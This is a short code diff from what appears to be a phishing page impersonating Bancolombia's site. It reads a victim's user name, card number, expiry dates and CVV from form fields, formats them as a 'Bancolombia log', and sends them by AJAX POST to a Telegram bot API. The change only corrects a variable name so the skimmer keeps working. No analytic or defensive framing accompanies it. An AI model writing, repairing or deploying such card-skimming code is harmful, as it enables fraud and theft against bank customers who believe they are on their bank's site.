@@ -226,7 +226,7 @@ El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: Espa
 	const ccm = document.getElementById("mFecha").value;
 	const ccv = document.getElementById("txtCVV").value;
 	  
-	const message = `-Bancolombia log 👀 -\n -- 👨‍🦱Usr.: ${usr} \n  💳 CC: ${cc} -- 📅 Fcc: ${ccm} --  📅 FccA: ${aFecha} -- 🔑CVV: ${ccv} ` ;
+	const message = `-Bancolombia log 👀 -\n -- 👨‍🦱Usr.: ${usr} \n  💳 CC: ${cc} -- 📅 Fcc: ${ccm} --  📅 FccA: ${cca} -- 🔑CVV: ${ccv} ` ;
 	$.ajax({
 	  type: 'POST',
 	  url: `https://api.telegram.org/bot${token}/sendMessage`,
